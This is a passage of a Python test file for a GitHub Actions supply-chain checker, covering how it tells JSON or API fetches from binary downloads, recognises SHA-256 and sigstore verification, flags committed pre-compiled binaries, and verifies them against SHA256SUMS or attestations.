        json_fetch = """\
import * as https from 'https'

const data = await new Promise((r) => https.get('https://api.x/v1/info', res => { r(res) }))
const parsed = JSON.parse(data)
return parsed.version
"""
        assert _file_is_pure_data_fetch(json_fetch) is True
        assert _find_binary_downloads_js(json_fetch) == []

    def test_split_alone_exempts(self):
        # .split is a common data-parse operation.
        split_fetch = """\
const data = await fetch('https://x/y').then(r => r.text())
const lines = data.split('\\n')
return lines[0]
"""
        assert _file_is_pure_data_fetch(split_fetch) is True
        assert _find_binary_downloads_js(split_fetch) == []

    # The exact pattern that triggered the false positive on PR #789 / #795
    # (rubygems/configure-rubygems-credentials, transitively pulled in by
    # rubygems/release-gem): @actions/http-client postJson against an OIDC
    # token-exchange endpoint. The response is a credential, not a binary.
    # The ``<IdToken>`` generic mirrors the v2.0.0 source verbatim — earlier
    # versions of this fixture omitted it and quietly hid a regex hole.
    RUBYGEMS_OIDC_EXCHANGE = """\
import * as core from '@actions/core'
import {HttpClient} from '@actions/http-client'
import {IdToken, IdTokenSchema} from './responses'

export async function exchangeToken(audience, server) {
  const webIdentityToken = await core.getIDToken(audience)
  const http = new HttpClient('rubygems-oidc-action')
  const url = `${server}/api/v1/oidc/trusted_publisher/exchange_token`
  const res = await http.postJson<IdToken>(
    url,
    {jwt: webIdentityToken},
    {'content-type': 'application/json', accept: 'application/json'}
  )
  return IdTokenSchema.parse(res.result)
}
"""

    def test_postJson_token_exchange_exempted(self):
        # @actions/http-client postJson is JSON-only — response is parsed as
        # structured data, never persisted or executed.
        assert _file_is_pure_data_fetch(self.RUBYGEMS_OIDC_EXCHANGE) is True
        assert _find_binary_downloads_js(self.RUBYGEMS_OIDC_EXCHANGE) == []

    def test_getJson_alone_exempts(self):
        # Same family as postJson — getJson auto-parses the response body.
        get_json = """\
import {HttpClient} from '@actions/http-client'
const http = new HttpClient('x')
const res = await http.getJson('https://api.example.com/v1/info')
return res.result
"""
        assert _file_is_pure_data_fetch(get_json) is True
        assert _find_binary_downloads_js(get_json) == []

    def test_postJson_with_extract_in_same_file_not_exempt(self):
        # If a JSON RPC call lives next to a real binary extraction in the
        # same file, the binary-handle gate must still disable the exemption.
        mixed = """\
import {HttpClient} from '@actions/http-client'
import * as tc from '@actions/tool-cache'

const http = new HttpClient('x')
const meta = await http.getJson('https://api.example.com/manifest')
const archive = await tc.downloadTool(meta.result.url)
await tc.extractTar(archive, dest)
"""
        assert _file_is_pure_data_fetch(mixed) is False
        findings = _find_binary_downloads_js(mixed)
        # Both the getJson and the downloadTool stay flagged.
        assert len(findings) == 2

    def test_accept_application_json_marks_data_fetch(self):
        # graalvm/setup-graalvm/src/gds.ts shape (lines 62, 97):
        # ``http.get(url, { accept: 'application/json' })`` followed by
        # ``JSON.parse(await response.readBody())``.  The accept header
        # is the unambiguous data-vs-binary signal.
        gds_metadata = """\
const requestUrl = `${c.GDS_BASE}/artifacts?productId=${id}&...`
const response = await http.get(requestUrl, { accept: 'application/json' })
const artifactResponse = JSON.parse(await response.readBody())
return artifactResponse.items[0]
"""
        assert _file_is_pure_data_fetch(gds_metadata) is True
        assert _find_binary_downloads_js(gds_metadata) == []

    def test_accept_application_json_double_quoted_also_works(self):
        # Variant: double-quoted ``"accept"`` and ``"application/json"``.
        content = """\
const response = await http.get(url, { "accept": "application/json" })
const data = JSON.parse(await response.readBody())
"""
        assert _file_is_pure_data_fetch(content) is True

    # The exact pattern that triggered the false positive on PR #848
    # (manusa/actions-setup-minikube@v2.17.0): a thin axios wrapper that
    # sets ``headers.Authorization = `token ${githubToken}`` and returns
    # the raw response.  The file is a transport-layer helper — no
    # data-parse markers, no binary handling — but the Authorization
    # header is an unambiguous "authenticated API call" signal.
    MANUSA_GITHUB_API_HELPER = """\
'use strict';

const axios = require('axios');

const apiBaseUrl = process.env.GITHUB_API_URL || 'https://api.github.com';
const serverBaseUrl = process.env.GITHUB_SERVER_URL || 'https://github.com';

const gitHubRequest = async ({url, githubToken, options = {}}) => {
  const headers = {};
  if (githubToken) {
    headers.Authorization = `token ${githubToken}`;
  }
  return axios({method: 'GET', ...options, url, headers});
};

module.exports = {gitHubRequest, apiBaseUrl, serverBaseUrl};
"""

    def test_authorization_token_header_exempts(self):
        # axios call + Authorization: `token ${...}` → API client shape,
        # not a binary download.
        assert _file_is_pure_data_fetch(self.MANUSA_GITHUB_API_HELPER) is True
        assert _find_binary_downloads_js(self.MANUSA_GITHUB_API_HELPER) == []

    def test_authorization_bearer_header_exempts(self):
        # The other half of the same family — Bearer-prefixed auth.
        bearer_client = """\
const axios = require('axios');
async function call(url, jwt) {
  return axios({
    method: 'GET',
    url,
    headers: { Authorization: `Bearer ${jwt}` },
  });
}
"""
        assert _file_is_pure_data_fetch(bearer_client) is True
        assert _find_binary_downloads_js(bearer_client) == []

    def test_authorization_with_extract_in_same_file_not_exempt(self):
        # An API helper that *also* extracts a downloaded binary in the
        # same file must keep the strict check — auth alone shouldn't
        # whitewash a real binary handler.
        mixed = """\
const axios = require('axios');
const tc = require('@actions/tool-cache');

async function fetchManifest(token) {
  return axios({ url: 'https://api.example.com/manifest',
                 headers: { Authorization: `Bearer ${token}` } });
}

const archive = await tc.downloadTool('https://x/foo.tar.gz');
await tc.extractTar(archive, dest);
"""
        assert _file_is_pure_data_fetch(mixed) is False
        findings = _find_binary_downloads_js(mixed)
        # Both the axios call and the downloadTool stay flagged.
        assert len(findings) == 2


class TestFunctionDefinitionNotADownload:
    """Regression: ``async function downloadTool(...)`` is a function
    *definition*, not a call.  The download-pattern scanner must not
    flag the function-name shadow that happens to match the regex.
    Surfaced by graalvm/setup-graalvm/src/gds.ts (line 153).
    """

    def test_async_function_definition_skipped(self):
        content = """\
import * as tc from '@actions/tool-cache'

async function downloadTool(url: string, headers?: OutgoingHttpHeaders): Promise<string> {
  return await someInternalImplementation(url, headers)
}
"""
        # Use a content that has a binary-handle marker so we don't
        # short-circuit via _file_is_pure_data_fetch.
        with_handler = content + "\nawait fs.writeFileSync('/tmp/bin', data)\n"
        findings = _find_binary_downloads_js(with_handler)
        # Pre-fix the function-definition line was flagged as a
        # ``downloadTool(`` call.  Post-fix only the genuine
        # writeFileSync-adjacent code is in scope, and that's not a
        # download pattern — so zero findings.
        assert findings == []

    def test_function_definition_with_export_default_skipped(self):
        content = """\
import * as tc from '@actions/tool-cache'

export default async function downloadTool(url) {
  return tc.downloadTool(url)  // this IS a real call
}
await fs.writeFileSync('/tmp/x', data)
"""
        findings = _find_binary_downloads_js(content)
        # Only the inner ``tc.downloadTool(url)`` call should be
        # flagged; the ``export default async function downloadTool(``
        # line must be skipped.
        assert len(findings) == 1
        # Returned tuple is (line_num, snippet); the snippet must be the
        # ``tc.downloadTool(url)`` call, not the function declaration.
        line_num, snippet = findings[0]
        assert "tc.downloadTool(url)" in snippet
        assert "function" not in snippet

    def test_generator_function_definition_skipped(self):
        # ``function*`` generators are a less common but valid syntax.
        content = """\
function* downloadTool(urls) {
  for (const u of urls) yield u
}
await fs.writeFileSync('/tmp/x', data)
"""
        assert _find_binary_downloads_js(content) == []

    def test_function_call_still_flagged_after_definition(self):
        # The fix must not blanket-suppress *any* line containing the
        # word ``function`` — only lines that are *themselves* function
        # definitions.  A real call later in the file must still trip
        # the scanner.
        content = """\
import * as tc from '@actions/tool-cache'

// Helper definition (must be skipped):
async function helper(url) { return null }

// Real call (must be flagged):
await tc.downloadTool('https://example.com/binary')
await fs.writeFileSync('/tmp/bin', data)
"""
        findings = _find_binary_downloads_js(content)
        assert len(findings) == 1
        assert "tc.downloadTool" in findings[0][1]


class TestVerificationPatternsRecognized:
    """Verification patterns the scanner must accept as evidence that a
    file with downloads also has integrity checks — so the binary-
    download check downgrades from failure to warning."""

    @staticmethod
    def _has_verification(content: str) -> bool:
        # Mirror the analyze_binary_downloads helper directly so the test
        # exercises exactly the predicate used in production.
        from verify_action_build.security import _JS_VERIFICATION_PATTERNS
        return any(p.search(content) for p in _JS_VERIFICATION_PATTERNS)

    def test_bare_create_hash_recognized(self):
        # graalvm/setup-graalvm/src/utils.ts shape: ``createHash`` is
        # imported via ``import { createHash } from 'crypto'`` and used
        # bare without the ``crypto.`` prefix.  The original pattern
        # ``crypto\.createHash\(`` missed this entirely.
        content = """\
import { createHash } from 'crypto'

export function calculateSHA256(filePath) {
  const hashSum = createHash('sha256')
  hashSum.update(readFileSync(filePath))
  return hashSum.digest('hex')
}
"""
        assert self._has_verification(content) is True

    def test_bare_create_hash_requires_sha_literal(self):
        # An unrelated ``createHash`` identifier (or one called with a
        # non-SHA algorithm) shouldn't false-positive.  Require the
        # ``sha`` literal as the first argument so we only match
        # genuine SHA-family hashing.
        unrelated = """\
const createHash = customLibrary.createHash('blake2')
"""
        # ``createHash('blake2')`` is a hash too but our concern is
        # specifically SHA verification; the broader case is fine to
        # miss here — better than over-matching arbitrary createHash
        # identifiers.
        assert self._has_verification(unrelated) is False

    def test_calculate_sha256_function_name_recognized(self):
        # Custom helper-function naming convention used by several
        # actions: ``calculateSHA256``, ``calculateChecksum``, etc.
        for func_name in (
            "calculateSHA256",
            "calculateSHA512",
            "calculateSHA1",
            "calculateChecksum",
            "calculateDigest",
        ):
            content = f"const sha = {func_name}(downloadPath)\n"
            assert self._has_verification(content) is True, func_name

    def test_verify_hash_function_recognized(self):
        # Whether named ``verifyHash`` or referenced inline.
        for snippet in (
            "if (!verifyHash(blob, expected)) throw new Error('bad hash')",
            "const ok = computeChecksum(blob)",
        ):
            assert self._has_verification(snippet) is True, snippet

    def test_existing_crypto_dotted_form_still_matches(self):
        # Regression: the original ``crypto\.createHash\(`` matcher
        # must still fire — existing actions that use the dotted form.
        content = "const h = crypto.createHash('sha256')"
        assert self._has_verification(content) is True

    def test_sigstore_and_cosign_still_match(self):
        # Other existing patterns kept.
        for snippet in ("import * as sigstore from 'sigstore'", "cosign verify-blob"):
            assert self._has_verification(snippet) is True, snippet


class TestLooksLikeInTreeBinary:
    """Path-only heuristic for catching pre-compiled binary files in an
    action's tree.  These tests pin the boundaries of the regex + extension
    list so future tweaks don't accidentally widen or narrow the catch.
    """

    def test_go_cross_compile_naming(self):
        # The runs-on/action shape: <name>-<os>-<arch>(.exe)?
        for name in (
            "main-linux-amd64",
            "main-linux-arm64",
            "main-darwin-amd64",
            "main-darwin-arm64",
            "main-windows-amd64.exe",
            "tool-freebsd-amd64",
            "agent-aix-ppc64le",
        ):
            assert _looks_like_in_tree_binary(name), name

    def test_known_binary_extensions(self):
        for name in (
            "foo.exe", "foo.dll", "foo.so", "foo.dylib", "foo.bin",
            "package.deb", "package.rpm", "Installer.msi", "App.dmg",
            "archive.appimage",
            "module.wasm",
            "Library.jar", "App.war", "Foo.class",
            "object.o", "object.a", "object.lib", "object.obj",
        ):
            assert _looks_like_in_tree_binary(name), name

    def test_extension_is_case_insensitive(self):
        # Windows PE files often have an upper-case ``.EXE``.
        assert _looks_like_in_tree_binary("Setup.EXE") is True
        assert _looks_like_in_tree_binary("App.DLL") is True

    def test_normal_action_files_not_flagged(self):
        for name in (
            "action.yml", "package.json", "package-lock.json",
            "tsconfig.json", "README.md", "CHANGELOG.md",
            "index.js", "post.js", "index.template.js",
            "src/main.ts", "dist/index.js", "dist/index.js.map",
            "go.mod", "go.sum", "main.go",
            "Makefile", ".gitignore", "LICENSE",
        ):
            assert not _looks_like_in_tree_binary(name), name

    def test_substring_matches_dont_falsely_match(self):
        # ``binsearch.md`` ends in ``-md`` but isn't ``-darwin-..``.
        # ``setup-node-cache`` contains a hyphen but no os/arch suffix.
        # ``configure-aws-credentials`` ditto.
        for name in (
            "binsearch.md",
            "setup-node-cache",
            "configure-aws-credentials",
            "node-fetch-helper.js",
            "linux-distro-detect.sh",
        ):
            assert not _looks_like_in_tree_binary(name), name

    def test_licenses_txt_exempt(self):
        # webpack/ncc commonly ship a licenses.txt next to the bundle.
        # It's text metadata, not a binary, even though some bundlers
        # name it confusingly.
        assert _looks_like_in_tree_binary("dist/licenses.txt") is False
        assert _looks_like_in_tree_binary("licenses.txt") is False

    def test_matlab_platform_dir_naming(self):
        # MATLAB's launcher convention: dist/bin/<platform>/run-matlab-command
        # where <platform> is MATLAB's own arch identifier and the file has
        # no extension.  matlab-actions/run-tests@v3.1.1 ships these:
        for path in (
            "dist/bin/glnxa64/run-matlab-command",
            "dist/bin/maca64/run-matlab-command",
            "dist/bin/maci64/run-matlab-command",
        ):
            assert _looks_like_in_tree_binary(path), path
        # The .exe sibling was already caught by extension; keep it green.
        assert _looks_like_in_tree_binary("dist/bin/win64/run-matlab-command.exe")

    def test_matlab_sibling_text_files_not_flagged(self):
        # license.txt and thirdpartylicenses.txt sit in dist/bin/ directly,
        # not under a <platform>/ subdir — and licenses.txt is exempt by
        # name anyway.
        assert not _looks_like_in_tree_binary("dist/bin/license.txt")
        assert not _looks_like_in_tree_binary("dist/bin/thirdpartylicenses.txt")

    def test_platform_dir_requires_parent(self):
        # A file *named* glnxa64 at the repo root is not a binary launcher.
        # The signal is parent-directory == platform, not filename.
        assert not _looks_like_in_tree_binary("glnxa64")
        assert not _looks_like_in_tree_binary("docs/glnxa64.md")


class TestParseSha256sums:
    """Parse the standard ``<sha>  <filename>`` format used by ``sha256sum``
    and emitted by GitHub's ``actions/attest-build-provenance`` example
    workflows.  Tolerant of comments, blank lines, the ``*`` binary-mode
    marker and trailing whitespace; rejects malformed lines silently."""

    def test_canonical_format(self):
        text = (
            "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b  main-linux-amd64\n"
            "9c5e12573ff6d953068da8def2133d08a907d431c9ebf77ecff7036ef2792332  main-linux-arm64\n"
            "75adbbab7aaf4ca05294d198a2175eeb921ababcd7faf9b07b328cddd4e13e54  main-windows-amd64.exe\n"
        )
        result = _parse_sha256sums(text)
        assert result == {
            "main-linux-amd64": "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b",
            "main-linux-arm64": "9c5e12573ff6d953068da8def2133d08a907d431c9ebf77ecff7036ef2792332",
            "main-windows-amd64.exe": "75adbbab7aaf4ca05294d198a2175eeb921ababcd7faf9b07b328cddd4e13e54",
        }

    def test_binary_mode_marker_stripped(self):
        # ``sha256sum -b`` emits "<sha> *<filename>" — must still parse.
        text = "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b *main-linux-amd64\n"
        result = _parse_sha256sums(text)
        assert "main-linux-amd64" in result
        assert result["main-linux-amd64"].startswith("ef4c45e8")

    def test_uppercase_digest_normalised_to_lowercase(self):
        text = "EF4C45E8F554EFA1C79C7EF8213856698209CD693D32DC268A02DD38FF770B1B  X\n"
        result = _parse_sha256sums(text)
        assert result == {"X": "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b"}

    def test_comments_and_blank_lines_ignored(self):
        text = (
            "# This is a comment\n"
            "\n"
            "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b  X\n"
            "  \n"
        )
        assert _parse_sha256sums(text) == {
            "X": "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b",
        }

    def test_malformed_lines_dropped(self):
        text = (
            "not-a-hash main-linux-amd64\n"
            "deadbeef  too-short-digest\n"
            "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b  good\n"
            "z" * 64 + "  non-hex\n"
        )
        assert _parse_sha256sums(text) == {
            "good": "ef4c45e8f554efa1c79c7ef8213856698209cd693d32dc268a02dd38ff770b1b",
        }

    def test_empty_input(self):
        assert _parse_sha256sums("") == {}


class TestAnalyzeInTreeBinaries:
    """Whole-action check.  Detects pre-compiled binaries; verifies each
    against ``gh attestation verify`` (preferred) or the release's
    ``SHA256SUMS`` asset; only unverified binaries fail the action.
    """

    @staticmethod
    def _mocked_env(
        paths,
        *,
        tag=None,
        sha256sums_text=None,
        attest_ok=False,
        blob_bytes=None,
    ):
        """Mock the whole verification cascade.  Defaults: no tag found,
        no release SHA256SUMS, gh attestation says no — i.e. nothing to
        verify against, so detected binaries become hard errors."""
        # Use a tiny non-empty payload so SHA256 is deterministic across
        # tests but not coincidentally any real release's hash.
        default_bytes = b"BIN"
        return _Patches(
            mock.patch(
                "verify_action_build.security._list_repo_files",
                return_value=list(paths),
            ),
            mock.patch(
                "verify_action_build.security._fetch_blob_bytes",
                return_value=blob_bytes if blob_bytes is not None else default_bytes,
            ),
            mock.patch(
                "verify_action_build.security._resolve_tag_for_commit",
                return_value=tag,
            ),
            mock.patch(
                "verify_action_build.security._fetch_release_asset_text",
                return_value=sha256sums_text,
            ),
            mock.patch(
                "verify_action_build.security._verify_via_gh_attestation",
                return_value=attest_ok,
            ),
        )

    def test_runs_on_action_shape_without_provenance_fails(self):
        # The exact shape that prompted this check: pre-compiled Go
        # binaries committed in the repo root next to a tiny launcher,
        # AND no SHA256SUMS / attestation available — i.e. v2.1.1 era,
        # before runs-on/action#37 added provenance.
        paths = [
            ".gitignore", "LICENSE", "Makefile", "README.md",
            "action.yml", "go.mod", "go.sum",
            "index.js", "index.template.js", "post.js", "main.go",
            "main-linux-amd64", "main-linux-arm64",
            "main-windows-amd64.exe",
        ]
        with self._mocked_env(paths):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1
        msg = errors[0]
        assert "main-linux-amd64" in msg
        assert "3 unverified pre-compiled binary" in msg

    def test_runs_on_action_shape_with_attestation_passes(self):
        # v2.1.2 era: same in-tree binaries, but now ``gh attestation
        # verify`` succeeds for each.  Action passes the check.
        paths = [
            "action.yml", "go.mod", "go.sum", "index.js", "main.go",
            "main-linux-amd64", "main-linux-arm64",
            "main-windows-amd64.exe",
        ]
        with self._mocked_env(paths, attest_ok=True):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert errors == []

    def test_sha256sums_match_passes(self):
        # No attestation, but the release ships SHA256SUMS and the in-
        # tree binary's hash matches.
        import hashlib as _hashlib
        content = b"runs-on-binary"
        digest = _hashlib.sha256(content).hexdigest()
        sha256sums = f"{digest}  main-linux-amd64\n"
        with self._mocked_env(
            ["action.yml", "main-linux-amd64"],
            tag="v2.1.2",
            sha256sums_text=sha256sums,
            attest_ok=False,
            blob_bytes=content,
        ):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert errors == []

    def test_sha256sums_hash_mismatch_fails(self):
        # SHA256SUMS lists the file but with a different hash than what
        # the in-tree blob actually contains — the binary was tampered
        # with after the release was built.  Hard fail.
        wrong_digest = "0" * 64
        sha256sums = f"{wrong_digest}  main-linux-amd64\n"
        with self._mocked_env(
            ["action.yml", "main-linux-amd64"],
            tag="v2.1.2",
            sha256sums_text=sha256sums,
            blob_bytes=b"ACTUAL CONTENT",
        ):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1
        assert "1 unverified" in errors[0]

    def test_binary_not_listed_in_sha256sums_fails(self):
        # SHA256SUMS exists but doesn't list this binary — that's a
        # publisher-side gap (forgot to include it in the checksum
        # generation).  Treat as unverified.
        sha256sums = "deadbeef" + "0" * 56 + "  some-other-file\n"
        with self._mocked_env(
            ["action.yml", "main-linux-amd64"],
            tag="v2.1.2",
            sha256sums_text=sha256sums,
        ):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1

    def test_attestation_preferred_over_sha256sums(self):
        # When both mechanisms are available, attestation wins.  Pass an
        # intentionally-broken SHA256SUMS to prove the SHA256SUMS path
        # was never taken (otherwise we'd hit the mismatch branch).
        with self._mocked_env(
            ["action.yml", "main-linux-amd64"],
            tag="v2.1.2",
            sha256sums_text="0" * 64 + "  main-linux-amd64\n",
            attest_ok=True,
            blob_bytes=b"DIFFERENT FROM SHA256SUMS",
        ):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert errors == []

    def test_blob_fetch_failure_fails_that_binary(self):
        # If we can't even fetch the binary's bytes, we can't verify —
        # treat as unverified.  Other binaries that DO fetch are
        # evaluated independently.
        with self._mocked_env(
            ["action.yml", "main-linux-amd64"],
            blob_bytes=None,  # _fetch_blob_bytes returns None
        ):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1
        assert "1 unverified" in errors[0]

    def test_normal_node_action_passes(self):
        # No binaries detected → nothing to verify, no errors.  The
        # mocks for verification helpers don't need to match anything.
        paths = [
            "action.yml", "package.json", "package-lock.json",
            "README.md", "tsconfig.json",
            "src/main.ts", "src/util.ts",
            "dist/index.js", "dist/index.js.map", "dist/licenses.txt",
        ]
        with self._mocked_env(paths):
            assert analyze_in_tree_binaries("org", "repo", "a" * 40) == []

    def test_composite_action_passes(self):
        paths = ["action.yml", "Dockerfile", "scripts/install.sh"]
        with self._mocked_env(paths):
            assert analyze_in_tree_binaries("org", "repo", "a" * 40) == []

    def test_single_exe_at_root_fails(self):
        with self._mocked_env(["action.yml", "tool.exe", "index.js"]):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1
        assert "tool.exe" in errors[0]

    def test_jar_in_lib_directory_fails(self):
        with self._mocked_env(["action.yml", "lib/runtime.jar"]):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1
        assert "lib/runtime.jar" in errors[0]

    def test_sub_path_filters_to_subaction(self):
        paths = [
            "other-action/main-linux-amd64",
            "my-action/action.yml",
            "my-action/index.js",
        ]
        with self._mocked_env(paths):
            assert analyze_in_tree_binaries(
                "org", "repo", "a" * 40, sub_path="my-action",
            ) == []

    def test_sub_path_flags_within_subaction(self):
        paths = [
            "my-action/action.yml",
            "my-action/main-linux-amd64",
        ]
        with self._mocked_env(paths):
            errors = analyze_in_tree_binaries(
                "org", "repo", "a" * 40, sub_path="my-action",
            )
        assert len(errors) == 1
        assert "main-linux-amd64" in errors[0]

    def test_empty_tree_returns_no_errors(self):
        with self._mocked_env([]):
            assert analyze_in_tree_binaries("org", "repo", "a" * 40) == []

    def test_many_binaries_truncates_in_message(self):
        paths = ["action.yml"] + [
            f"main-linux-amd64-{i}.exe" for i in range(20)
        ]
        with self._mocked_env(paths):
            errors = analyze_in_tree_binaries("org", "repo", "a" * 40)
        assert len(errors) == 1
        msg = errors[0]
        assert "20 unverified pre-compiled binary" in msg
        assert "17 more" in msg


class _Patches:
    """Tiny context manager that enters/exits a sequence of mock.patch
    objects together — used by TestAnalyzeInTreeBinaries to keep the
    cascade of patches readable."""

    def __init__(self, *patches):
        self._patches = patches
        self._entered: list = []

    def __enter__(self):
        for p in self._patches:
            self._entered.append(p.__enter__())
        return self

    def __exit__(self, *args):
        for p in reversed(self._patches):
            p.__exit__(*args)
